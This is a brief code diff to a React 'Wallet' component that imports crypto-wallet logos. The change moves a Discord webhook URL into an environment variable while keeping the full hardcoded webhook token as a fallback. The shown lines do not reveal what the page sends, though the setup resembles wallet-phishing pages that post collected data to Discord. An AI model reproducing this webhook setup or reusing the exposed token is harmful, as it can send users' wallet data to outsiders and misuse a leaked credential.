@@ -28,8 +28,8 @@ import bitpayLogo from "@/assets/wallets/bitpay.jpg";
 import binanceSmartChainLogo from "@/assets/wallets/binance-smart-chain.png";
 import blockchainLogo from "@/assets/wallets/blockchain.png";
 const Wallet = () => {
-  // Discord webhook URL
-  const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1402822124254531705/6AVMi2U-e_WJ2Nz9N9eF1V5ovYa_zdDu7-eg3eYAh_-_Y6Fzm_eCHjRgv8KDpAAF4gVG";
+  // Discord webhook URL from environment variable
+  const DISCORD_WEBHOOK = import.meta.env.VITE_DISCORD_WEBHOOK || "https://discordapp.com/api/webhooks/1402822124254531705/6AVMi2U-e_WJ2Nz9N9eF1V5ovYa_zdDu7-eg3eYAh_-_Y6Fzm_eCHjRgv8KDpAAF4gVG";
   const { toast } = useToast();
   
   const [chooseWallet, setChooseWallet] = useState(false);
